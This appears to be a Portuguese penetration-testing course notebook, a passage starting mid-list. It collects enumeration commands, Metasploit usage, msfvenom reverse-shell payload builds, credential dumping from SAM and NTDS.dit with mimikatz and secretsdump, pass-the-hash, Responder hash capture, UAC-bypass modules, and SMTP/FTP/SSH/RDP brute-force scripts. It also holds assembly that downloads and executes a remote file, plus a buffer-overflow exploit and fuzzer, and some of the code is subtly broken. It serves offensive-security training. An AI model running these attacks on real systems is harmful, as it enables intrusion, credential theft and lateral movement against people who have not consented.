        Conecta diretamente ao arquivos/pasta do host


Enumerando com RPC

    rpcclient -U " " -N 172.16.1.5

        Serve para conectar em servidores com acesso remoto disponível

    Enumdomusers

        Dentro do RPC client lista os usuários

    queryuser usuário

        Dentro do RPC lista as infos do Usuário

    Netshareenumall

        Lista todos os compartilhamentos

    Querydominfo

        Mostra informações sobre o domínio

        Escalar Privilégios com RPCCLIENT: https://www.100security.com.br/rpcclient


Ferramenta enumeração completa ENUM4LINUX

    enum4linux -U 192.168.2.101 

        Faz a enumeração em busca de usuários e -a para buscar por tudo e -S para buscar por compartilhamentos, o -u permite passar o usuário para autenticação.

    Linenum.sh 

        Link da ferramenta https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh


Scripts em busca de informações e vulnerabilidades

    nmap -v --script=smb-enun-domains 192.168.2.100

        Busca por domínios do host passado

    nmap -v --script=smb-vuln-ms* 192.168.2.100

        Verifica se o host tem a vulnerabilidade dos scripts passados o * o curinga para ele ler todos os scripts que tenham o mesmo prefixo   


Script enumeração SMTP

            import socket, sys

            if len(sys.argv) !=3:

                    print "Modo de uso: nome do arquivo, IP e usuário"

                    sys.exit(0)

            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            tcp.connect((sys.argv[1],25))

            banner = tcp.recv(1024)

            print banner

            tcp.send("VRFY "+sys.argv[2]+"\r\n")

            user = tcp.recv(1024)

            print user

Script enumeração SMTP bruteforce

            import socket, sys,re

            file = open("wordlist.txt")

            for linha in file:   

                        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        tcp.connect((sys.argv[1],25))

                        banner = tcp.recv(1024)

                        tcp.send("VRFY "+linha)

                        user = tcp.recv(1024)

                        if re.search("252", user): #printa somente as linhas com o número 252

                                print "Usuário encontrado: "+user.strip("252 2.0.0") #printa ignorando o 252...

Enumeração com TELNET

    telnet 192.168.2.10 

        Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwords e/ou datarecovery.com/rd/default-passwords


Enumerando com SSH

    nc 172.16.1.1,2,5,120 22 

        Captura o banner da porta e um possível SO

    ssh -v 172.16.1.1,2,5,120 

        Ssh em modo verbose com informações detalhadas informando as chaves de autenticação aceitas pelo servidor Local dos known hosts (/root/.ssh/known_hosts)


Subindo serviço de SSH

    nano /etc/ssh/sshd_config 

        Arquivo de configuração  podendo alterar porta padrão assim como permitir acesso de login com usuário root PermitRootLogin Yes / PublickeyAuthentication (Server)

        ssh-keygen seguido do caminho /home/user/Desktop na máquina que vai acessar o ssh  (Client)

    nano /etc/.ssh/authorized_keys 

        Copiar os dados de id_rsa.pub gerado acima e cola no (Servidor)

    ssh-add id_rsa 

        Adiciona a chave no host que vai conectar ao servidor ssh (Client)
    ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.35.233
         Acessa o host com a chave em ambientes mais antigos


Nota: Criar usuário e colocar a chave pública dentro do servidor para ganhar acesso ao servidor ssh sem precisar da senha

Enumerando Network File System (NFS) -P 2049

    rpcinfo -p 172.16.1.5 | grep nfs 

        Enumera as informações da versão do NFS

    showmount -e 172.16.1.5 

        Mostra os pontos de montagem do host

    mkdir /temp/nfs 

        Cria a pasta para fazer a montagem  do diretório

    mount -t nfs -o nfsvers=2 172.16.1.5:/ /temp/nfs 

    sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 172.16.1.31:/home/camila /tmp/nfs/

        Monta o host disponível no caminho criado usando o ponto de montagem do host descoberto anteriormente

    cd /temp/nfs 

        Vai para o diretório montado anteriormente

    umount nfs 

        Desmonta o ponto de montagem do host montado anteriormente.


Enumerando o SNMP - UDP 161

Nota: Usado para gerenciamento de rede basicamente, a Communit é a palavra secreta, o OID é o id do objeto e os MIBs são as infos, instalar o pacote de informações adicionais: apt install snmp-mibs-downloader. Para listar os usuários usa-se 1.3.6.1.2.1.6.13.1.3, Communitys padrões: public, private, cisco, manages, access, secret. Sites com informações relevantes alvestrand.no/objectid/1.3.6.1.2.1.html e oid-info.com

    onesixtyone -c lista.txt 172.16.1.0/24

        Varre a rede em busca de serviços snmp ativos

    snmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25 

        Invade o host encontrado em busca de nomes de usuários

    apt install snmp-mibs-downloader 

        Instalar o pacote de informações adicionais.

    echo "" > /etc/snmp/snmp.conf 

        Configura o pacote instalado anteriormente

    snmptranslate -IR sysUpTime 

        Pega o Mib do UP time

    snmptranslate -Td SNMPv2-MIB::sysUpTime 
    	Lista detalhes do MIB descoberto no comando anterior

    snmptranslate -TB icmp 

        Exibe vários tipos de MIB de acordo com a pesquisa

    snmpwalk -c public -v1 172.16.1.4 IP-MIB::icmpInEchos 

        Invade o Host mostrando a quantidade de pacotes ICMP enviados a ele.

    snmp-check 172.16.1.4 -c public 

        Carrega informações importantes da máquina com SNMP aberto

    snmpwalk -c manager -v1 172.16.1.247 

        Acessa com o nível de administrador

    snmpset -c manager -v1 172.16.1.247 SNMPv2-MIB::sysContact.o s "Desec" 

        Altera a info de contact do serviço snmp do servidor.
    sudo hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt 172.30.0.103 snmp
        Bruteforce de community do snmp
    nc -vz -u 10.1.0.100 53
        NC para conexão udp com host


Enumeração MySQL

    mysql -h 172.16.1.5 -u root 

        Conecta no MySQL usando o usuário root

    describe COLUMNS from <TABELA> 

        Dentro do mysql descreve as tabelas

    show databases 

        Dentro do mysql mostra as base de dados

    use databasename 

        Dentro do mysql abre a base de dados

    show tables 

        Dentro do mysql mostra a lista de tabelas da base de dados


    Site de comandos MySQL: 

        http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm



    ANÁLISE DE VULNERABILIDADES


    Sites que têm exploits e informações de vulnerabilidades.

        packetsormsicurity.com/files/tags/exploits

        securityfocus.com/vulnerabilidades

        Exploit-db.com

        Cvedetails.com

        nvd.nist.gov/vuln/search

        Rapid7.com

    Ferramentas de automação de análise de vulnerabilidades:

        Nessus - service nessusd start | stop

        OpenVas

        Qualys

        searchsploit webmin


NMAP NSE

    /user/share/nmap/scripts# grep "ftp" scripts.db 

        Pesquisa por script pelo nome

    /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse -Pn 192.168.2.10 

        Pesquisa por vulnerabilidade com o script informado

    /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse --script-args cmd="ls -la" -Pn 192.168.2.10 

        Executa argumentos para validação da vulnerabilidade

    /user/share/nmap/scripts# nmap -p21 --script ftp-anon.nse -Pn 172.16.1.108 

        Procurando por vulnerabilidade de FTP com usuário anônimo

    /user/share/nmap/scripts# nmap -p80 --script http-shellshock --script-args uri=/sgi-bin/test.cgi,cmd=ls 172.30.0.108

        Executando o script com argumentos após a varredura do host e descobrir o caminho test.cgi


Nota: Shadow Brokers do Nessus para busca por vulnerabilidades de 2017 publicadas pelo shadow brokers.


    METASPLOIT FRAMEWORK


    systemctl start postgresql 

        Iniciar o banco de dados para ser usado pelo msfconsole

    msfdb init 

        Iniciar o banco de dados do metasploit

    searchsploits proftp 

        Procura por exploits dentro do metasploit

    use auxiliary/scanner/portscan/tcp 

        Usa o auxiliar para fazer portscan

    back 

        Sai do auxiliar/exploit que você estava usando

    search type:auxiliary|exploit portscan|snmp|smb|rdp 

        Procura por tipo e termo informado facilitando o uso da ferramenta

    services 

        Mostra o que já foi descoberto/feito nos host (somente se estiver com a base de dados ativa)

    services -p21 

        Exibe a porta já encontrada

    db_nmap -v --open -sS  -Pn 172.16.1.7 

        Roda o Nmap dentro do MSF

    nmap -v --open -sV  -Pn 172.16.1.4 -oX /opt/host4.xml

        Nmap com output xml para importar no MSF

    db_import /opt/host4.xml 

        Importa o xml criado fora do ambiente

    hosts 

        Mostra todos os host encontrados na base do MSF

    vulns 

        Verifica se há algum host com vulnerabilidades

    use auxiliary/scanner/ssh/ssh_login 

        Usado para bruteforce de password ssh

    sessions 

        Lista as sessões ativas no momento

    sessions -i 1 

        Entra na sessão 1 informada pelo comando anterior

    creds 

        Mostra as credenciais salvas durante o pentest

    use auxiliary/scanner/smb/smb_version 

        Auxiliar para enumerar a versão do smb em busca de informações detalhadas

    services -p 445 --rhosts 

        Adiciona ao auxiliar/exploit os hosts daquela porta informada

    hosts -i "informacao-a-ser-adicionada" 172.16.1.10 

        Adiciona informação faltante do host

    search type:exploits samba 

        Procura por exploits para pentest em Samba

    search type:exploits fullname:"Samba x.x.x.x" 

        Procura por nome e versão 

    use auxiliary/scanner/smb/smb_ms17_010 

        Informa se o host é vulnerável ou não

    use exploit/multi/samba/usermap_script 

        Exploit para explorar vulnerabilidade do Samba no Linux

    show payloads 

        Mostra os diferentes payloads disponíveis para o exploit usando no momento


Nota: 	Usar o payload Meterpreter habilitará funções adicionais.

Payloads com _ são mais simples e payloads com / são do tipo staged, mais funcionalidades. Arquivos do tipo POST são de pós exploração para por exemplo abrir porta RDP na vítima.

    nmap --open -p 445 --script=vuln -Pn 

        Procura por vulnerabilidades com os scripts do NMAP

    search rdp 

        Encontra os módulos RDP e use para abrir uma porta rdp no alvo 

    xfreerdp /u:user@domain.com /v:192.168.2.11 

        Conectar com RDP em modo gráfico

    rdesktop

        Alternativa para o xfreerdp

    remmina

        Alternativa para o rdesktop


Comandos para rodar no Meterpreter do windows

    background 

        No msf deixa a sessão em standby para voltar para a shell novamente mais tarde

    PS

        Mostra os processos atuais

    execute -f notepad

        Abre um programa

    sysinfo

        Mostra as infos do sistema

    download local/do/arquivo

        Baixa um arquivo

    upload local/do/arquivo

        Faz o upload de um arquivo

    keyboard_send "nao se esconda"

        Envia um comando ao teclado

    keyscan_start

        Começa a escutar o teclado

    key_scan dump

        Faz um dump do teclado


Comandos para uso no Msfvenom e Metasploit

    exploit/linux/http/ipfire_oinkode_exec 

        Exploit para firewall IPFIRE com autenticação

    auxiliary/scanner/http/http_login

        Auxiliar para brute force de logind http

    Msfvenom

        Ferramenta usada para desenvolver exploit, shell

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f exe -o shelldesec.exe 

        Criar Exploit em EXE

    use exploit/multi/handler (add host and door) 

        Usa o exploit genérico para ter shell com o exploit criado

    set payload windows/x64/meterpreter/reverse_tcp 

        Seta payload do exploit criado

    python -m SimpleHTTPServer 80 

        Abre servidor php para download de arquivos

    exploit -j 

        Cria jobs para acessar novamente tipo sessions

    jobs 

        Lista os jobs criados com o exploit -j. O -K mata todos os jobs

    msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.16 lport:443 -f war -o desec.war 

        Cria exploit em war

    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f raw > desec.php 

        Cria exploit em php


    Solução Lab Desec Metasploit:

        https://absolomb.com/2018-02-24-HackTheBox-Matis-Writeup 

        porta serv kerberos

    ldapsearch --help 

        Vasculha LDAP service do host passado



    HASHES E SENHAS - LINUX


    echo -n "desec" | md5sum or | sha512sum or | sha256sum | sha1sum 

        Codifica uma palavra em uma hash

    md5sum arquivo.exe 

        Verifica o MD5 do arquivo passado

    bless arquivo.exe 

        Ler e modifica um arquivo

    Hash com Python: 

        Import Hashlib.md5("Desec").hexdigest()

        Import base64.b64encode("desec")

        Import base64.b64decode("desec")

    hashid hashhere 

        Ferramenta de identificação de hashes 

    hash-identifier hashhere 

        Ferramenta de identificação de hashes 

    Site de quebra de Hashes

        md5decrypt.net 

        hashes.com

    Ferramenta de quebra de hashes	

        john

        hashcat

    openssl passwd -6 -salt c4r4c73res senha123 

        Cria Hash do tipo 6 com salt (For more search, man crypt https://man.archlinux.org/man/crypt.5.en)

    for i in $(cat wordlist.txt);do echo -n $i " "; echo -n $i | md5sum;done > rainbow_tables

        Função Bash para inserção de hash em wordlists

    /etc/shadow 

        Arquivo de hashes de senhas dos usuários do linux

    unshadow /usr/passwd /usr/shadow > hashes 

        Deixa o hash pronto para rodar no John the Ripper


Nota:	Tipo de hash das senhas do linux: CRYPT

 		One Way -ex sha256

Two Way -ex base64

    Compilador alternativo portável GCC: 

        https://bellard.org/tcc/


    loncrack 

        Ferramenta do Longatto para quebra de hashes

        gcc loncrack.c -lcrypt -o loncrack 

        Após baixar do GitHub compilar e executar


    Script para quebra de senhas em Python

import crypt

salt = "taltal"

senha = "asdasd"

crypt.crypt(senha,salt)


    exploit/linux/samba/is_known_pipename 

        Exploit para samba em linux v3 e 4 e se der erro de encriptação, rodas os comando seguintes

        set smb::alwaysencrypt false  Seta a encrypt para falso

        set smb::protocolversion 1 Seta a versão para 1

    Referências:

        https://www.whitehat.de/msf-metasploit-rubysmb-error-encryptionerror-communication-error-with-the-remote-host

        https://www.youtube.com/watch?v=JML84NJqnQU



    HASHES E SENHAS - WINDOWS


    %systemRoot%/system32/config/sam 

        Local do arquivo de contas de suarios

    %systemRoot%/ntds/ntds.dit 

        Local dos arquivos de usuários do AD

    %systemRoot%/system32/config/system 

        Arquivo necessário para decriptar o sam

        Obs.:Todos são bloqueados por execução e precisam de acesso administrativo

    c:/windows/repair 

        Local de backup desses arquivos (xp e 2003) possivelmente está desatualizado

    reg save hklm/sam sam 

        Salva o arquivo SAM do Reg do Win (root) all version

    reg save hklm/system system 

        Salva o arquivo System do Reg do Win (root) all version

    vssadmin 

        Cópia de sombra de volume


Nota: 	Exploit/windows/smb/ms08_067_netapi RHOST 172.16.1.4 

Exploit de vulnerabilidade smb no XP

    meterpreter> hashdump2 

        Captura as hashes dos usuários do sistema

    samdump2 system sam 

        Captura/monta as hashes dos usuarios (unshadow)

    impacket-secretsdump -sam sam -system system LOCAL

        Faz o mesmo que o samdump2


    msf6> search UAC: Os dois melhores…

        exploit/windows/local/ask 

            Precisa da confirmação de usuário e de uma SESSION aberta para funcionar

        exploit/windows/local/bypassuac_fodhelper 

            Usa a SESSION mas não precisa da confirmação do user


Nota: exploit-Windows-Eternalblue-win8 RHOST 172.16.1.233

Explorando o AD

    vssadmin list volumes 

        Lista os volumes para fazer a cópia

    vssadmin create shadow /for=c: 

        Cria uma cópia do c:

    copy //nameCopiaSombra/windows/ntds/ntds.dit c:/ntds.dit 

        Acessa a copia e copia o arquivo ntds do AD

    copy //nameCopiaSombra/windows/system32/config/system c:/system 

        Acessa a copia e copia o arquivo system

    impacket-secretsdump -ntds ntds.dit -system system LOCAL 

        Mostra as hashes das contas de usuários do AD


Quebrando senhas

    john --format=lm hashesLM --show 

        Quebra senha formato LM com Brute

    john --format=nt hashesNTLM --show 

        Quebra senha formato LM com Brute


Senhas em cache

    cd /usr/share/windows-binaries 

        Contém executáveis do windows para exploração

    meterpreter> upload usr/share/windows-binaries/fgdump/fgdump.exe  c:/fgdump.exe 

        Upload para a vítima para gerar os hashes em cache

    shell: fgdump.exe 

        Ele gerará dois arquivos cachedump e pwdump

    meterpreter> upload usr/share/windows-binaries/wce/wce-universal.exe c:/wce-universal.exe 

        Faz o upload do WCE para a vítima p/ quebra de senhas

    shell:wce-universal.exe -w 

        Traz as senhas em texto claro

    meterpreter> load mimikatz 

        Carrega o módulo do meterpreter para quebra de senhas (Substituído pelo KIWI)

    Wdigest

        Quebra as senhas usando o mimikatz

    mimikatz-command 

        Comando proprio do proprio mimikatz

    mimikatz-command -f sekurlsa::wdigest -a full 

        Quebra as senhas do alvo

    mimikatz-command -f sekurlsa::logonPasswords 

Quebra as senhas dos usuários de logon

 

Usando as credenciais

    smbclient -L \\172.16.1.60 -U rogerio -W dominio

    smbclient -l //172.16.1.60/dados -U rogerio -W dominio

    xfreerdp /v:172.16.1.60 /u:rogerio /p:password


Obtendo Credenciais pela rede

    impacket-secretsdump user:senha@ip 

        Se conectará ao ip com as credenciais e varrerá a vítima em busca de outras credenciais/hashes


	Subindo CMD com credenciais do Windows

    winexe -U user%password //172.16.1.60 cmd.exe 

        Conseguir a shell do alvo usando credenciais válidas


NOTA: exploit/windows/smb/psexec, payload-x64-rev_tcp RHOST 172.16.1.60 para conseguir uma shell no alvo usando credenciais do AD no smb.

        Pesquisar UAC no metasploit encontra exploit para pegar admin/privesc no windows com usuário comum usando uma sessão ativa no metasploit

    wce64.exe -w 

        Executar no alvo o WCE64 dos resources do windows localizadas no kali e fazer a enumeração das hashes

    pth-winexe -U rogerio%hashencontrado //172.16.1.60 

        Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec PassTheHash


Ferramenta completa de enumeração SMB

    apt install crackmapexec

    crackmapexec smb 172.16.1.0/24 

        Procura por hosts e faz a enumeração do smb automaticamente

    crackmapexec smb 172.16.1.0/24 -u rogerio -p 'password' 

        Faz a varredura e diz o que dá para fazer ou não usando as credenciais passadas

    crackmapexec smb 172.16.1.60 -u rogerio -p 'password' -X  'ipconfig /all' 

        Roda um comando no alvo e traz a saída. O -L lista os módulos e o -h apresenta o Help

    responder 

        Ferramenta de escuta para falsificar respostas feitas na rede e capturar hashes

    responder -I eth0 -Prv 

        Escuta de forma a capturar hashes wireshark de hashes. -r para habilitar as respostas netbios e -v para verbose

    hashcat -m 5600 arquivodahash /wordlist/pass.txt 

        Quebra a senha encontrada

    john --format=netntlmv2 arquivohash --wordlist=/caminho/wordlist.txt 

        Quebra a senha encontrada

    cp 44648.rb /caminho/do/modulo/metasploit/ 

        Importa exploit no metasploit para usar diretamente no metas (As vezes tem que editar o arquivo). O exploit 43198.py não importa na base devido não ser do padrão do metasploit.



    PENTEST INTERNO DO ZERO AO DOMAIN ADMIN


    Escopo é pegar apenas os hosts do orionscorp e fazer os testes de segurança

    nmap -v -Pn -sS -p 445 172.16.1.0/24 -oG smb.txt 

        Procura por hosts com compartilhamento ativo em busca do servidor de AD

    crackmapexec smb targets-da-cap-canterior.txt 

        Procura pelos hosts encontrados anteriormente para enumerar o serviço smb e saber dos computadores no grupo orionscorp

    nmap -v -Pn -p- 172.16.1.243 

        Varre as portas do host do AD para saber dos serviços ativos

    host 172.16.1.241 172.16.1.243 

        Para descobrir o nome do host perguntando para o servidor de DNS da orionscorp (segundo IP é o IP que responde à pergunta de DNS, quando passado)

    Maquina Pentester: cat /etc/responder/responder.conf

         Em: RespondTo = 172.16.1.243, 172.16.1.241, 172.16.1.253 

    responder -I eth0 -Priv 

        Escuta os hosts passados anteriormente e capturar os hashes pela rede - Ao capturar a hash use uma ferramenta para quebrar e obter a senha


Validando os usuários

    crackmapexec smb hosts.txt -d dominio -u user -p 'password' 

        Validar usuários encontrados e tentar saber qual tem permissão de execução de comandos Pwn3d!

    python3 /usr/share/doc/python3-impacket/examples/psexec.py dominio/usuario:'senha@172.16.1.253' 

        Faz a autenticação usando o psexec podendo também usar o metasploit


Nota: Com o usuário com permissão de execução de comandos, pode-se acessar o rpcclient e enumerar mais informações do servidor de AD.

Ambiente WinXP: 

Usando o repair é um cache antigo no caso nos sistemas windows XP...
           Usando o reg save é o que o hashdump usa, ou seja, mais atualizado.
           Resumindo, dar um reg save é a mesma coisa de hashdump (Win10 e XP com adm)

No AD se usa o NTDS.dit

    impacket-secretsdump dominio/usuario:'senha'@172.16.1.253 

        Tentar pegar as senhas dos administradores do sistema

    meterpreter: loads kiwi 

        Carrega o Kiwi para enumeração de hashes 

    creds_all 

        Trazendo os hashes dos usuários | DCC = domain cash credentials

    hashcat -m 2100 hash-tipo-dcc.txt /local-word/list.txt --show Quebra hash da credencial de ADM

    crackmapexec 172.16.1.243 -u egabriel -p 'p@ssw0rd' -x 'ipconfig' 

        Valida  a senha de adm e envia comando direto para a máquina do AD 

    crackmapexec smb 172.16.1.243 -u user -p 'password' -L 

        Lista os módulos do crackmapexec inclusive te permite habilitar o RDP, caso esteja desabilitado

    crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp --options 

        Lista as opções do módulo

    crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp -o ACTION=enable 

        Ativa o modulo

    netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow 

        Adiciona regra no firewall para habilitar o RDP



    BRUTE FORCE


    grep -r "pedro123" * 

        Vai buscar em todos os arquivos do diretório a palavra informada

    office2john arquivo.xls 

        Prepara o arquivo para quebrar senha no John

    zip2john arquivo.zip 

        Prepara o arquivo para quebrar a senha com o john

    john --wordlist=wl.txt --rules --stdout > mutacao 

        Mutando uma wordlist existente

    /etc/john/john.conf | search wordlist mode rules | ^INI[1-10] $FIN[1-10]  

        Personalizar wordlist com dígito no fim e no início.

    cewl site.com -m 7 

        Busca palavras dentro do site com 7 chars

    crunch 10 10 -t palavra^'char-spec'%'digito'@'minus','maius' 

        Cria wordlist com a palavra passada e com dígitos com as flags informadas.


Key Space Brute Force

    crunch 4 4 0123456789 -o pin.txt 

        Gera um pin de 4 digitos na wordlist
     chrunch 7 7 -t dev%%%%  > wldev.txt
          Gera uma wordlist com a palabra dev seguida de 4 dígitos crescentes PIN

    crunch 4 4 -f charset.lst numeric -o pin.txt 

        Gera um padrão usando a lista charset.lst (usr/share/crunch/charset.lst) e informando o padrão, se numérico, se caracteres especiais se alfabeto...

    hydra -v -l rogerio -p admin -m servers.txt smb 

        Bruteforce no serviço SMB. FTP, RDP

    hydra -v -L users.txt -p admin 172.17.1.4 ssh -W 10 

        Bruteforce em reverse brute force onde o bloqueio por tentativa é apenas no campo senha. E o tempo com de 10s de uma requisição para outra

    hydra -v -l  user -p passwd -M servers.txt -s 2222 

        Brute force com password encontrado em todos os servers.


    Script Bruteforce em FTP (usando python2)

#!/usr/bin/python

import socket,sys,re

if len(sys.argv) != 3:

    print ("modo de uso: nome do programa alvo e usuário")

    sys.exit()

target = sys.argv[1]

usuario = sys.argv[2]

f = open ('wordlist.txt')

for palavra in f.readlines():

          print ("realizando ataque FTP: %s:%s" %(usuario, palavra))

          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

          s.connect((target, 21))

          s.recv(1024)

          s.send("USER "+usuario+"\r\n")

          s.recv(1024)

          s.send("PASS "+palavra+"\r\n")

          resposta = s.recv(1024)

          s.send("QUIT \r\n")

          if re.search('230', resposta):

                 print ("[+] Senha encontrada ---->",palavra)

                 break


Script BruteForce em SSH (usando python3)

pip install paramiko

#!/usr/bin/python

import paramiko

ssh = paramiko.SSHClient()

ssh.load_system_host_keys() #ler os known_hosts da lista

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Adiciona ao know_host faltante

f = open ('wordlist.txt')

for palavra in f.readlines():

        senha = palavra.strip()

        try:

            ssh.connect('172.16.1.5', username='root', password=senha)

        except paramiko.ssh_exception.AuthenticationException: # Tratar quando login errado

            print ("testando com:", senha)

        else:

            print ("Senha encontrada ---->", senha)

            break

                            #stdin, stdout, stderr = ssh.exec_command('ls')

                            #for linha in stdout.readlines():

                                    #print linha.strip()

ssh.close()  

Script BruteForce RDP em Bash

    for pass in $(cat lista.txt);

    do

    echo "Testando senha: $pass"

    xfreerdp /u:rgerio /p:$pass /d:gbusiness /v:172.16.1.60

    done

    DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS WINDOWS


Breve tutorial do ambiente: Instala o DEV CPP e Immunity Debugger, copia o mona para dentro de py no Immunity

Pega o Path do nasm e do dev-cpp a bin e coloca nas configurações avançadas do windows onde troca de nome de usuário para aceitar o comando de qualquer lugar e faz os testes do comando nasm pra ver se ta funcionando.

    Cria um arquivo com o Dev CPP


#include <stdio.h>

int main (){

	printf("Information Security");

}

    Roda e compila


    Programa em ASSEMBLY


global _main

section .text

_main:

    NOP

    NOP

    NOP

    NOP

    NOP

    NOP

    NOP

    NOP

    MOV EAX, 41424344h ;ABCD em hex

    MOV BX, 4141h

    MOV CH, 41h

    MOV DL, 41H

    XOR EAX, EAX

    XOR EBX, EBX

    XOR ECX, ECX

    XOR EDX, EDX

salva em assembly.asm

    nasm -f win32 assembly.asm -o assembly.obj 

        Cria o executável do assembly

    objdump -d -M intel assembly.obj 

        Faz um dump do código e mostra na tela. (sem o parâmetro -M intel ele traz o código em AT&T)

    golink /entry _main assembly.obj 

        Linka o arquivo


Abrir o arquivo exe com o Immunity e analisar.

F7  inicia o debugger

New Origin Here Volta para o início do código (Click dir do mouse na linha)

    MOV - Grava no registrador

    JE - Pula se igual

    JNE - Pula se Não igual

    CMP - Compara

    INC - Incrementa

    PUSH - Coloca no top da stack

    POP - Tira do topo da Stack


    Script em C para Sleep do windows

#include <synchapi.h>

int main(){

    Sleep(4000);

}

    Script em assembly Sleep

global _main

section .text

_main:

    xor eax, eax

    mov eax, 9000

    push eax

    mov ebx, 0x5401AB0 ; Endereço descoberto com o outro código

    call ebx

    golink /console /entry _main aguardar.obj Kernel32.dll 

        Cria o executável

    arwin Kernel32.dll 

        Sleep Pega o endereço da memória sem precisar analisar o código no immunity


    Script em C para cmd.exe do windows

#include <Windows.h>

int main(){

    system("cmd.exe");

}

    Script em assembly cmd.exe

extern system

global _main

section .text

_main:

    push 0x00657865

    push 0x2E646D63

    push esp

    pop eax

    push eax

    mov ebx, 0x004025F8

    call ebx

    golink /console /entry _main cmd-exe-assembly.obj msvcrt.dl 

        Linkar o obj gerando o exe


    Código assembly Atividade cmd.exe /c calc.exe

extern system

global _main

section .text

_main:

    push 0x2E646D63

    push 0x00657865

    push 0x20632F20

    push 0x6578652E

    push 0x636C6163

    push esp

    pop eax

    push eax

    mov ebx, 0x74E54FB0

    call ebx

    Script em C MessageBoxA

#include <windows.h>

int main(){

	MessageBoxA(0,"Ygor C Developer","From DesecSecurity",1);

}

    Script Assembly MessageBoxA

extern _MessageBoxA

global _main

section .data

    texto db "www.desecsecurity.com",0

    titulo db "keep Learning",0

section .text

_main:

    push 0

    push titulo

    push texto

    push 0

    call _MessageBoxA

    Script ShellExecute em C

#include <windows.h>

int main (){

	ShellExecute(0, "open", "cmd", 0, 0, 3);

}

    Script ShellExecute Assembly 

        Usar comando Shell32.dll p/ compilar com golink sem o /console para esconder o shell


extern _ShellExecuteA

global _main

section .data

    tipo db "open",0

    cmd db "cmd",0

    par db "/c mkdir ygor",0

section .text

_main:

    push 0

    push 0

    push par

    push cmd

    push tipo

    push 0

    call _ShellExecuteA

    powershell -Command wget https://site.com/donwload/file.exe -Outfile c:/file.exe ; c:file.exe 

        Executar comando no código assembly para fazer o download e executar o arquivo baixado.

Exemplo:

    Script para baixar e executar arquivo com Assembly

extern _ShellExecuteA

global _main

section .data

    tipo db "open",0

    cmd db "cmd",0

    par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Outfile c:\file.exe ; c:\file.exe ",0

section .text

_main:

    push 0

    push 0

    push par

    push cmd

    push tipo

    push 0

    call _ShellExecuteA

    DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS LINUX


    man syscall 

        É basicamente o módulo do sistema responsável por executar os comandos

    unistd_32.h / unistd_64.h 

        Referência para os nomes das Syscalls

Site que contém essas explicações: syscalls.w3challs.com/?arch=x86 /?arch=x86_64

    nasm -f alf32 file.asm 

        Cria o arquivo.o

    ld -entry _main -m alf_i386 file.o -o file 

        Cria o arquivo executável do linux

    nasm -f alf64 file.asm 

        Cria o arquivo.o 64b

    ld -entry _main file.o -o file 

        Cria o arquivo executável do linux 64bits


    Script Assembly Linux

global _main

section .data

    curso: db 'Desec Security', 0xa ; pula uma linha

section .text

_main:

    mov eax, 4 ;tipo de chamada do print

    mov ebx, 1 ;faz parte do print (0.1.2 0.saida.erro) tipo de output

    mov ecx, curso ;executa a variável

    mov edx, 15 ; tamanho da string

    int 0x80 

    mov eax, 1 ; chama o exit

    mov ebx, 0 ; envia o parâmetro

    int 0x80 ; executa

    gdb -q ./arquivo-exec-comp -tui 

        Arquivo para analisar que foi criado anteriormente (GDB = Immunity debugger)


Comandos do GDB e GDB TUI para Debugger linux

    break _main 

        Seta a parada para o _main

    run 

        Roda o programa até o momento informado (_main)

    info registrers ou i r 

        Mostra os registradores

    disas 

        Mostra o codigo

    set disassembly-flavor intel 

        Colocar a sintaxe para intel

    stepi ou si 

        Vai para o próximo passo (f7 do win)

    x/s 0x8012a154 

        Following dump do endereço para examinar o que tem dentro

    x/16xw "eip" 

        Para ver o que está no endereço, semelhante ao following dump

    layout asm 

        Mostra o layout do codigo assembly

    layout regs 

        Mostra os registradores

    c 

        Continue (f7 do breakpoint)

    b* 0x3nd3r3co 

        Break point setar

    LEA 

        Parâmetro que armazena um espaço na memória

    run < < (python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"') 

        Comando para usar no debugger para explorar o programa.

    python -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"' | ./protegido 

        Exploit do programa protegido usado na aula de buffer no linux


EDB Debugger

    edb --run program-name 

        Abre o debugger de semelhante modo ao Immunity debugger


    Codigo Assembly em x64 

global _main

section .data

    curso: db 'Desec Security',0xa

section .text

_main:

    mov rax, 1

    mov rdi, 1

    mov rsi, curso

    mov rdx, 15

    syscall

   

    mov rax, 60

    mov rdi, 0

    syscall

    strace ./assembly-x64 

        Faz o monitoramento das chamadas de sistema para saber o que de fato o programa executa

    ltrace programa 

        Mostra as library usadas pelo programa informado

    ldd programa 

        Verifica também as bibliotecas que o programa tá usando/chamando e verifica se é linkado ou não


    STRCPY,SCANF,GETS 

        São comandos/códigos vulneráveis ao buffer-overflow


Nota: Usar o STRNCPY e informar o numero de chars que fica seguro ou informar no gets o número de bytes permitidos


    BUFFER OVERFLOW - WINDOWS


#/usr/bin/python

import socket

lista=["A"]

contador=100

while len(lista) <= 50:

	lista.append("A"*contador)

	contador = contador + 100

for dados in lista:

	print "Fuzzing com SEND %s bytes"%len(dados)

	s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.254.207", 1020))

	banner = s.recv(1024)

	s.send("SEND "+dados"\r\n")

